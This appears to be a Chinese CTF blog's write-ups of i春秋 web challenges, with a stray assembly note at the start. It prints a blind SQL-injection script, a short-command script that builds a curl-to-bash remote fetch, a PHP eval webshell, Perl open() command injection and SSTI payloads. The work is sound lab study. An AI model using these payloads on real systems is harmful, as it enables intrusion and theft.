X86指令集的基本特色1.向下兼容（对前一代处理器的扩展）2.变长指令1-15字节，多数为2-3字节长度3.多种寻址方式（可访问不对齐内存地址4.指令集的通用寄存器个数有限x86-32系统下拥有8个通用寄存器（x86-64拓展到16个）至多能有一个操作数在内存中，另一个操作数为立即数或者寄存器","link":"/2021/02/21/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"},{"title":"i春秋12","text":"web——Mangager感觉就像是sql注入，但是过滤了’ 所以要寻找一下其他信息， 查看源码，发现 123456789101112131415161718$(document).keydown(function(e) { if (e.keyCode == 222 || e.keyCode == 188 || e.keyCode == 190) { alert(&quot;Illegal character&quot;); return false; }});function getnonce() { var text = &quot;&quot;; var possible = &quot;0123456789abcdef&quot;; for (var i = 0; i &lt; 40; i++) text += possible.charAt(Math.floor(Math.random() * possible.length)); return text;}$('#submit').click(function() { this._nonce = getnonce();});'' Js看不太懂，百度完各个函数后大致可以知道:text的长度为40每个字符的算法是，先得到一个随机数，然后*possible的长度，最后取整，看是多少，然后再possible里面去这个是用来生成提交时的一个验证的但是当我们输入两个一样的username的时候，_nonce的值是不变的于是再去看看有没有其他源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132function sign (data, key) { var privateKey var i, j var W = new Array(80) var A, B, C, D, E var H0 = 0x97B5D3F1 var H1 = 0x1F3D5B79 var H2 = 0x684A2C0E var H3 = 0xE0C2A486 var H4 = 0x33221100 var H5 = 0xF0F0F0F0 var temp var _RSA = function (n, s) { var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s)) return t4 } var _Rot = function (val) { var str = '' var i var v for (i = 7; i &gt;= 0; i--) { v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f str += v.toString(16) } return str } str = unescape(encodeURIComponent(key + data)) var strLen = str.length var wordArray = [] for (i = 0; i &lt; strLen - 3; i += 4) { j = str.charCodeAt(i) &lt;&lt; 24 | str.charCodeAt(i + 1) &lt;&lt; 16 | str.charCodeAt(i + 2) &lt;&lt; 8 | str.charCodeAt(i + 3) wordArray.push(j) } switch (strLen % 4) { case 0: i = 0x080000000 break case 1: i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000 break case 2: i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000 break case 3: i = str.charCodeAt(strLen - 3) &lt;&lt; 24 | str.charCodeAt(strLen - 2) &lt;&lt; 16 | str.charCodeAt(strLen - 1) &lt;&lt; 8 | 0x80 break } wordArray.push(i) while ((wordArray.length % 16) !== 14) { wordArray.push(0) } wordArray.push(strLen &gt;&gt;&gt; 29) wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff) H0 ^= H5 H1 ^= H5 H2 ^= H5 H3 ^= H5n c H4 ^= H5 for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) { for (i = 0; i &lt; 16; i++) { W[i] = wordArray[privateKey + i] } for (i = 16; i &lt;= 79; i++) { W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1) } A = H0 B = H1 C = H2 D = H3 E = H4 for (i = 0; i &lt;= 19; i++) { temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } for (i = 20; i &lt;= 39; i++) { temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } for (i = 40; i &lt;= 59; i++) { temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } for (i = 60; i &lt;= 79; i++) { temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } H0 = (H0 + A) &amp; 0x0ffffffff H1 = (H1 + B) &amp; 0x0ffffffff H2 = (H2 + C) &amp; 0x0ffffffff H3 = (H3 + D) &amp; 0x0ffffffff H4 = (H4 + E) &amp; 0x0ffffffff } temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4) return temp.toLowerCase() }$(document).ready(function() { $(&quot;#&quot; + &quot;f&quot; + &quot;r&quot; + &quot;m&quot; + &quot;l&quot; + &quot;o&quot; + &quot;g&quot; + &quot;i&quot; + &quot;n&quot;).submit(function(e) { var z1 = $(&quot;#&quot; + &quot;u&quot; + &quot;s&quot; + &quot;e&quot; + &quot;r&quot; + &quot;n&quot; + &quot;a&quot; + &quot;m&quot; + &quot;e&quot;).val(); var z2 = $(&quot;#&quot; + &quot;p&quot; + &quot;a&quot; + &quot;s&quot; + &quot;s&quot; + &quot;w&quot; + &quot;o&quot; + &quot;r&quot; + &quot;d&quot;).val(); $('&lt;' + 'i' + 'n' + 'p' + 'u' + 't' + '&gt;').attr({ type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n', name: '_' + 'n' + 'o' + 'n' + 'c' + 'e', value: sign(z1 + z2, &quot;YTY&quot; + &quot;0Yj&quot; + &quot;M0Y&quot; + &quot;2Rh&quot; + &quot;ZTZ&quot; + &quot;iMj&quot; + &quot;liZ&quot; + &quot;jFj&quot; + &quot;OTQ&quot; + &quot;xOD&quot; + &quot;==&quot;) }).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n'); });}); 这里找到两部分源码，可以发现_nonce是key+username+password组成的，接下来通过SHA1（因为这里是80个字符）的加密得到的。 接下来将username换成注入语句试试 当我们使用admin’and 1=1#的时候 页面回显是Incorrect password! 当我们使用admin’and 1=2#时，页面回显是User name does not exist此时，这里就可以使用盲注脚本，编写一下: 123456789101112131415161718192021import requestsimport hashlibs=requests.session()url=r&quot;http://83cb089ea0e440d5a7c26fb473e06defc9a769f1f7394b84.changame.ichunqiu.com/login.php&quot;headers=s.get(url).headerspayload=&quot;0123456789abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM!@#$%^&amp;*()_+}{&quot;text=&quot;1&quot;pass_go=&quot;&quot;fi_result=&quot;&quot;null=&quot;&quot;for i in range(1,50): for j in payload: pass_go=f&quot;admin'and substr(database(),{i},1)='{j}'#&quot; hash_encode =&quot;YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==&quot;+pass_go+&quot;1&quot; hash_encode = hashlib.sha1(hash_encode.encode(&quot;utf-8&quot;)).hexdigest() data ={&quot;username&quot;:pass_go,&quot;passwowrd&quot;:&quot;1&quot;,&quot;submit&quot;:&quot;&quot;,&quot;_nonce&quot;:hash_encode} print(data) print(s.post(url,headers=headers,data=data).text) if &quot;Incorrect password!&quot; in s.post(url,headers=headers,data=data).text: fi_result+=j print(fi_result) 反复检查了好几遍，都没发现脚本有什么问题，看了一下wp，直接复制别人的脚本也没跑出来，不知道是哪里出了问题 web——粗心的小李看到标题，git泄露扫描一下 扫到一个index.html打开就有flag了 1n1book{git_looks_s0_easyfun} web——babyfirst-revenge12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); 得到以上代码，开头很熟悉，之前也有做过类似的，这里直接搬运一下: 12345&lt;?php$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; .&quot;175.43.121.213&quot;);print($sandbox);?&gt;//curl httpbin.org/ip#sandbox/abb91d64b309e1928c7725fcefde973b 审计一下代码:get一个cmd，并且其长度要小于5，如果小于5就会执行该命令，所以我们要构造一个长度小于5的命令去执行:这里参考一篇文章https://blog.csdn.net/hunanchenxingyu/article/details/45047813linux可以是用反斜杠实现参数换行，表示下一行是当前行的续行。但是我们可以直接题目中一个片段一个片段的输入吗？显然是不行的，所以我们要将输入的命令存储在文件中，然后执行文件的时候即可执行我们的指令了。但是尽管我们输入ls，画面依旧没有回显，所以这里需要考虑反弹shell或者写马这里直接甩脚本吧：插一句题外话：在做i春秋题目的时候 总有种题目有年代的感觉，询问完老师后发现确实如此，所以想赶紧去buu 或者攻防世界刷点新题，但是想了一下还是耐着性子先把这题做完吧！思路：1.绕过长限制执行多条命令，需要将命令放到文件中执行2.如何将命令放到文件中执行呢？3.使用输出重定向符号4.通过在目录下建立多个文件，使用ls将所有文件名重定向至新文件中，对文件使用读取命令即可 由于本题无法输出内容所以我们只能根据反弹shell或者写马来做：这里是脚本： 12345678910111213141516171819202122232425262728293031323334353637383940import requestsfrom time import sleepurl = 'http://192.168.248.132:8083/index.php?cmd=%s'def main(): re = requests.get('http://192.168.248.132:8083/index.php?reset=1') payload = [ '&gt;-t\\\\', '&gt;\\&gt;A', '&gt;l\\\\', '&gt;s\\ \\\\', 'ls&gt;B', 'ls&gt;&gt;B', '&gt;ash', '&gt;\\|b\\\\', '&gt;2\\\\', '&gt;1:8\\\\', '&gt;8.\\\\', '&gt;24\\\\', '&gt;68.\\\\', '&gt;2.1\\\\', '&gt;19\\\\', '&gt;l\\ \\\\', '&gt;cur\\\\', 'sh%20B', 'sh%20A'] for each in payload: re = requests.get(url % each) if(re.status_code != 200): print 'Something error!' return 0 sleep(0.1) print 'Have done!'if __name__ == '__main__': main()","link":"/2021/03/07/i%E6%98%A5%E7%A7%8B12/"},{"title":"i春秋10","text":"web——Musee de X这题怎么都注册不了，sql注入也没效果，试了一下弱口令 admin&amp;password 页面直接报错，扫描也没扫出什么，看了一下wp，说就是要注册？可能是环境崩了吧，于是决定看一下wp学习思路逛一下网站——得到报错信息——确定是ssti注入——fuzz过滤内容——构造注入语句——寻找可利用子类——cat flag还挺无语的 web——ssrfme123456789101112&lt;?php $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); //创建目录 @chdir($sandbox); //更改目录为那个 $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); //escapeshellarg把字符串转码为可以在 shell 命令里使用的参数，并且能转义其中的单引号，shell_exec()调用GET来执行命令， $info = pathinfo($_GET[&quot;filename&quot;]); //get filename $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); //basename() 函数返回路径中的文件名部分。 highlight_file(__FILE__); 首先我们需要弄清楚REMOTE_ADDR”这个和服务器建立tcp握手的ip究竟是多少，在查找了许多指令后，终于：在cmd窗口输入curl httpbin.org/ip，然后得到的IP代入一下代码中 12345&lt;?php$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; .&quot;175.43.121.213&quot;);print($sandbox);?&gt;#sandbox/abb91d64b309e1928c7725fcefde973b 代码解析都在上面了，但是思路还不是很清楚，于是乎去看了一下wp。首先需要知道一个知识点perl文件可以执行命令https://news.ycombinator.com/item?id=3943116 12$userinput = &quot;cat /etc/passwd |zenity --text-info |&quot;;open(file_handler, &quot;$userinput&quot;); 可以发现open函数是可以执行命令的 而GET函数底层就是调用了open处理 1234file.pm84: opendir(D, $path) or132: open(F, $path) or return new#这里的open中的path是可控的，所以可以把文件名拼接入命令导致命令执行。 open函数本身还支持file协议 123456789101112131415161718...=head2 File RequestThe library supports GET and HEAD methods for file requests. The&quot;If-Modified-Since&quot; header is supported. All other headers areignored. The I&lt;host&gt; component of the file URL must be empty or setto &quot;localhost&quot;. Any other I&lt;host&gt; value will be treated as an error.Directories are always converted to an HTML document. For normalfiles, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response areguessed based on the file suffix.Example: $req = HTTP::Request-&gt;new(GET =&gt; 'file:/etc/passwd');... 我们前面说过GET支持file协议，所以我们可以利用这点来寻找flag文件：GET file:///这样是访问根目录： 1?url=file:///&amp;filename=1.txt 接下来该如何读取呢？直接使用file://读取试试： 1?url=file:///readflag&amp;filename=5.txt 发现是ELF文件，可执行的，那么在这里为什么没有出执行结果呢？原因是，直接/readflag的话是将其源码传入，而不是将执行结果传入,而这里猜测是需要flag是需要执行后才能出来的这里还需要了解一点：GET 执行命令前必须要有以命令为文件名的文件存在所以最终思路是：创建一个以命令命名的文件，在执行该命令将其结果传入新文件中 而之前的使用file协议加个/只是访问根目录知道这点后，我们可以直接构造语句： 12?url=?filename=|/readflag?url=file:|/readflag&amp;filename=111 接下来访问111即可拿到flag 1flag{d9faf0e7-6152-48be-8c5c-479c9681bcf3} 小结：梳理一下吧，感觉做的挺模糊的：分析源码，发现有shell函数执行命令——使用GET函数执行命令——GET指令特性：open()函数可以执行系统命令——构造payload——获得flag。 补充：果然放着不管总有点疙瘩于是再去查找了一下资料： 12345678910111213141516...# URL OK, look at filemy $path = $url-&gt;file;# test file exists and is readableunless (-e $path) {return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND, &quot;File `$path' does not exist&quot;);}...# read the fileif ($method ne &quot;HEAD&quot;) {open(F, $path) or return new HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR, &quot;Cannot read file '$path': $!&quot;); 1.我们输入的内容是由get执行的，get执行的是path，如果path本身是命令，就会直接执行。2.get执行的对象其实是$path,当我们传入的命令的时候，找不到该path，就会出现$path’ does not exist，所以此时我们需要先建立出同命令的文件名，更合理的说应该是路径。如果我的理解有误一定来和我讨论一下，，， web——XSS平台看了一下wp，构造错误数据，引发报错回显，得到关键信息rtiny，厘清一下这里的思路：根据题目，这是一个xss平台，除此之外无更多信息，那么我就需要知道这是什么xss平台，并根据版本去寻找对应的漏洞或者源码，那么此时要怎么去寻找呢？第一，看看页面有没有什么提示，第二，根据报错信息，那么如何报错呢?SQL注入在这里无法报错，也就是内容无法报错，所以此时尝试一下更改数据类型达到报错的效果。 （我也不知道是个啥） 上github搜索一下： 原来rtiny是一个xss平台，在github有他的源码，我们查看登录源码看看有没有什么收获： 1234567891011121314151617181920212223242526272829__author__ = 'r0ker'import tornado.webimport dbfrom config import URL, sqlfrom function import md5class LoginHandler(tornado.web.RequestHandler): def get(self): if self.get_secure_cookie(&quot;username&quot;) and self.get_secure_cookie(&quot;password&quot;): self.redirect(&quot;/&quot;) else: self.render(&quot;login.html&quot;, url=URL) def post(self): self.set_header(&quot;Content-Type&quot;, &quot;text/plain&quot;) if True not in [f in self.get_argument(&quot;email&quot;) for f in sql]: row = db.ct( &quot;manager&quot;, &quot;*&quot;, &quot;username='&quot;+self.get_argument(&quot;email&quot;)+&quot;' and password='&quot; + md5(self.get_argument('pass'))+&quot;'&quot;) if row: self.set_secure_cookie(&quot;username&quot;, row['username']) self.set_secure_cookie(&quot;password&quot;, row['password']) self.write(&quot;true&quot;) else: self.write(&quot;false&quot;) else: self.write(&quot;false&quot;) 123456789101112131415161718192021__author__ = 'r0ker'import tornado.webfrom function import md5import dbfrom config import URLclass LockHandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(&quot;lock&quot;,'1') self.render(&quot;lock.html&quot;) def post(self): username = self.get_secure_cookie(&quot;username&quot;) or '' passwd = md5(self.get_argument('password', '')) row = db.ct(&quot;manager&quot;, &quot;*&quot;, &quot;username='&quot; + username + &quot;' and password='&quot; + passwd + &quot;'&quot;) if row: self.set_secure_cookie(&quot;lock&quot;, &quot;0&quot;) self.redirect(&quot;http://&quot; + URL) else: self.redirect(&quot;http://&quot; + URL + &quot;/lock&quot;) 有的时候感觉这些代码好难读，于是将其和对应的类移到一起一看： 1234567row = db.ct(&quot;manager&quot;, &quot;*&quot;, &quot;username='&quot; + username + &quot;' and password='&quot; + passwd + &quot;'&quot;)def ct(table, column, where): return db.get(&quot;select &quot;+column+&quot; from &quot;+table+&quot; where &quot;+where)#变成是 select * from manager where username='' and password= ''#在这里使用sql注入：#select * from manager where username=''and.. #''and password= '#所以此时我们需要知道self.get_secure_cookie中的cookie是多少？在index.py中发现cookie_secret为M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc= 思路：根据上面得到信息，厘清一下思路：1.我们注入的页面时lock，因为lock里面存在SQL注入点2.它使用了self.get_secure_cookie()函数，解密获得username，所以此时我们要加密出我们注入语句的cookie值，通过我们发现的cookie_secret，并结合tornado框架中的加密函数在本地获得加密后的内容3.由于报错页面在login页面，所以我们要抓包login页面，再更改为地址更改为lock，最后添加username的cookie值。加密内容脚本编写： 1234567891011121314151617181920212223import tornado.webimport tornado.ioloopsettings={ &quot;cookie_secret&quot;:&quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;}class indexhandler(tornado.web.RequestHandler): def get(self): #self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat((select group_concat(table_name) from information_schema.tables where table_schema='xss')))#&quot;) #self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='manager')))#&quot;) #self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat(0x7e,(select group_concat(username,password,email) from manager)))#&quot;) self.set_secure_cookie(&quot;username&quot;,&quot;'and extractvalue('~',concat(0x7e,(substr((select load_file('/var/www/html/f13g_ls_here.txt')),1,60))))#&quot;) self.write(self.get_secure_cookie(&quot;username&quot;))if __name__ == &quot;__main__&quot;: app=tornado.web.Application( [ (r&quot;/&quot;,indexhandler), ],**settings#cooki_secret:xxxx的简写 ) app.listen(8004)#端口注意别冲突 tornado.ioloop.IOLoop.current().start() 1 接下来就是组合券，其实突然想起来，我们的用户名密码就是在manager当中，因为在看源码的时候那个语句是select * from manager wherexxxx 登录以后： 这里有个小坑，当我在查询字段名的时候，是这样的： 即内容是没有显示完整的，大概是长度被限制了，所以我们要用substr截取一下，后来才发现，哎我是忘记格式了，我们说extractvalue报错注入，报错内容在问题字符之后，所以我们在我们的查询语句之前要加上~,这一次我比较懒，在前面一条注入的时候没加也可以，于是后面也没加了，原来是不行的，前面一条可以是因为是database()，可能前面就是某个特殊字符了，而我其实也不知道数据库真实是啥样的，就以为那个是正确的！犯大错了！！ 很明显这里是没截全的，这个时候有两种办法，一种就是只显示password即可，另一种是用substr或者mid截取，这里为啥我知道没截全，因为我前面是只查询了password，出来的是后面的一半，这里其实可以做个小标记 在查询的username password email中间加个分隔符作为标记 密码需要MD5解密，这里直接拿别人的了： ichuqiu|318a61264482e503090facfc4337207f|545 MD5解密得密码Myxss623 额，我看成密码是ichunqiu试了好几次，没想到是ichuqiu==还挺无语的。。。 flag在这里，接下来就是将它打开，我们可以使用select load_file(‘’) 很明显没截完，所以使用substr截一下 flag{e13482d8-ccee-47fb-8a43-2a03eb9d70c5} 加强记忆这里有个需要加强记忆的点就是 这个select load_file(‘’) 使用sql语句查看文件的方法1、必须有权限读取并且文件必须完全可读。 1、需要有权限2、欲读取文件必须在服务器上3、必须指定文件完整的路径4、欲读取文件必须小于max_allowed_packet https://www.cnblogs.com/blacksunny/p/8060028.html","link":"/2021/03/02/i%E6%98%A5%E7%A7%8B10/"},{"title":"i春秋9","text":"web——look检查完源码，扫描完后台没有收获后，抓包看返回，看到一个 可疑内容X-HT: verify,推测是sql注入的变量在注入过程中，限制了长度，只能4个字符，百度以后发现可以使用‘/1%23、’*1%23、’=0%23、’%1%23 这里说一下自己的理解，查询语句应该是是select * from xxx where xxx =，记得之前的-0-和-1-，当为-0-的时候是可以查询到结果的，而以上这些运算的结果都为0，所以可以成功绕过 得到下一条线索： 一开始我以为又是sql注入，发现不是 看了sql注入后发现是 在vim中操作的行为，vim会自动记录下来，保存在~/.viminfo文件中所以让我们打开看看 1234567891011121314151617181920212223&lt;?php$con = mysql_connect('localhost','root','');mysql_query(&quot;set names utf8&quot;);mysql_select_db(&quot;ctf&quot;);if($_SERVER[&quot;REMOTE_ADDR&quot;]=='8.8.8.8'){ $name = addslashes($_GET['usern3me']);}else{ if(stripos($_GET['usern3me'],'Bctf2O16')!==false){ $name = 'FUCK'; } else{ $name = addslashes($_GET['usern3me']); }}echo 'hello '.$name;$sql = &quot;select * from admin where name='$name'&quot;;$result = mysql_query($sql);$num = mysql_num_rows($result);if($num&gt;0){ echo '&lt;br&gt;next ***.php';}?&gt; 访问其中的一个备份文件可以得到以上代码：输入usern3me不能等于Bctf2o16，如果等于就会直接让name=fuck，查询的时候肯定是出错的，那么这里要让usern3me等于什么呢？肯定就是Bctf2o16吧，所以要如何绕过呢？ mysql字符集mysql中有两种字符集编码：使用utf8_general_ci和utf8_unicode_ci两种 校对规则下面的比较相等：Ä = A、Ö = O、Ü = U，参考：https://blog.csdn.net/lovemysea/article/details/79074759所以这里想要绕过，直接传Bctf2Ö16即可： 1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bctf2Ö16 123456789101112131415161718192021&lt;?phpif(isset($_GET['path']) &amp;&amp; isset($_GET['filename'])){ $path = $_GET['path']; $name = &quot;upload/&quot;.$_GET['filename'];}else{ show_source(__FILE__); exit();}if(strpos($name,'..') &gt; -1){ echo 'WTF'; exit();}if(strpos($path,'http://127.0.0.1/') === 0){ file_put_contents($name,file_get_contents($path));}else{ echo 'path error';}?&gt; 得到新的php代码：get一个path和filename不为空的话分别复制给path和name，然后name当中的’..’大于-1，就输出WTF导致退出，意思是末尾必须有两个..吗？然后接下来如果在path中截取的位置截取那个地址是在开头，那么就将path的内容写入name中。我的思路是这样的让name为php文件，然后写入的path就直接是系统命令或者一句话木马，接下来看了一下wp发现思路是这样的，但是没那么容易现在本地模拟一下感受一下吧:1.加上http://127.0.0.1/这个前缀后有什么区别？没加上前缀前，访问的就是本地文件系统，相当于直接访问源码，在上述代码中，path中的内容会直接被写入name中，也就是path中的源码，加了前缀，写入name中的内容就是在url中执行以后的内容2.为啥这里要利用那个传入usern3me的php文件？file_get_contents() 函数把整个文件读入一个字符串中，所以这里需要的是一个文件，所以需要利用那个文件。在这里构造一下payload再继续理清楚一下: 1/c3368f5eb5f8367fd548b228bee69ef2.php?filename=a.php&amp;path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php eval($_POST[a]);?&gt; 因为传入的是url读取以后的结果，也就是代码被执行以后的功能，此时a.php将会输出hello，以及一句话木马会被解析，这个地方需要理解一下。PS：由于file_file_get_contents相当于访问一次url获取其中的内容所以需要对里面的空格进行二次urlencode,接下来被解码后才会是空格用蚁剑连接a.php 即可拿到flag flag{e034f45b-464a-42bb-a262-1635c08f30bf} WEB——exec一开始看了很久没啥突破，于是看了一下wp，原来突破口在这里找到答案说，用vim编辑文本xxx.php中途退出，会自动创建一个文件.xxx.php.swp。然后我们下载这个文，这里应该就是.index.php.swp源码泄露，下载下来看看 使用 vim -r 加上那个文件就能还原源码，接下来看看这段源码吧会get一个sign并使用check函数每一个数字的值都不能再1-9之间，看了一下wp，所以这里要上传一个十六进制的数字即可绕过如：0xabcdef往下看，接下来需要post一个cmd，会使用exec执行：但是执行结果不会被输出，那该咋办？看了一下wp:还记得之前的重定向符号吗，在这里我们就是要这么利用，在两天服务器中使用nc命令建立连接，使得被攻击者服务器的内容重定向输出至攻击者服务器:现在我之前买的公网服务器上监听:用了所有的指令都没成功是什么鬼== web——fuzz检查完后台 有一个robots.txt文件查看源码：，有一串经过base64编码过的内容，将其解码看： burpsuit抓包都没拿到有用信息？可能是我太菜了吧，于是去看wp：他是让我们fuzz parameter就是传参的参数名，一开始我尝试了几个，因为没有字典可以爆破就放弃了，没想到还真是要这么猜，当传入?name的时候网页的回显发生了变化： 看到那只大蟒蛇，又看到这个界面——python ssti注入尝试payload: 1?name={{10*10}} 页面返回excuse，好像有什么被过滤了，再尝试10-10，页面回显hello 0，确定过滤*号，接下来使用： 1{{&quot;&quot;.__class__.__mro__[1]}} 页面回显的不是object类，于是更换参数： 1{{&quot;&quot;.__class__.__mro__[2]}} 1{{&quot;&quot;.__class__.__mro__[2].__subclasses__()}}#显示所有子类 1[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'itertools.combinations'&gt;, &lt;type 'itertools.combinations_with_replacement'&gt;, &lt;type 'itertools.cycle'&gt;, &lt;type 'itertools.dropwhile'&gt;, &lt;type 'itertools.takewhile'&gt;, &lt;type 'itertools.islice'&gt;, &lt;type 'itertools.starmap'&gt;, &lt;type 'itertools.imap'&gt;, &lt;type 'itertools.chain'&gt;, &lt;type 'itertools.compress'&gt;, &lt;type 'itertools.ifilter'&gt;, &lt;type 'itertools.ifilterfalse'&gt;, &lt;type 'itertools.count'&gt;, &lt;type 'itertools.izip'&gt;, &lt;type 'itertools.izip_longest'&gt;, &lt;type 'itertools.permutations'&gt;, &lt;type 'itertools.product'&gt;, &lt;type 'itertools.repeat'&gt;, &lt;type 'itertools.groupby'&gt;, &lt;type 'itertools.tee_dataobject'&gt;, &lt;type 'itertools.tee'&gt;, &lt;type 'itertools._grouper'&gt;, &lt;type 'cStringIO.StringO'&gt;, &lt;type 'cStringIO.StringI'&gt;, &lt;class 'string.Template'&gt;, &lt;class 'string.Formatter'&gt;, &lt;type 'collections.deque'&gt;, &lt;type 'deque_iterator'&gt;, &lt;type 'deque_reverse_iterator'&gt;, &lt;type '_thread._localdummy'&gt;, &lt;type 'thread._local'&gt;, &lt;type 'thread.lock'&gt;, &lt;type 'datetime.date'&gt;, &lt;type 'datetime.timedelta'&gt;, &lt;type 'datetime.time'&gt;, &lt;type 'datetime.tzinfo'&gt;, &lt;class 'werkzeug._internal._Missing'&gt;, &lt;class 'werkzeug._internal._DictAccessorProperty'&gt;, &lt;type 'time.struct_time'&gt;, &lt;class 'email.LazyImporter'&gt;, &lt;type 'Struct'&gt;, &lt;type '_hashlib.HASH'&gt;, &lt;type '_random.Random'&gt;, &lt;class 'socket._closedsocket'&gt;, &lt;type '_socket.socket'&gt;, &lt;type 'method_descriptor'&gt;, &lt;class 'socket._socketobject'&gt;, &lt;class 'socket._fileobject'&gt;, &lt;class 'urlparse.ResultMixin'&gt;, &lt;class 'calendar.Calendar'&gt;, &lt;type '_io._IOBase'&gt;, &lt;type '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'werkzeug.datastructures.ImmutableListMixin'&gt;, &lt;class 'werkzeug.datastructures.ImmutableDictMixin'&gt;, &lt;class 'werkzeug.datastructures.UpdateDictMixin'&gt;, &lt;class 'werkzeug.datastructures._omd_bucket'&gt;, &lt;class 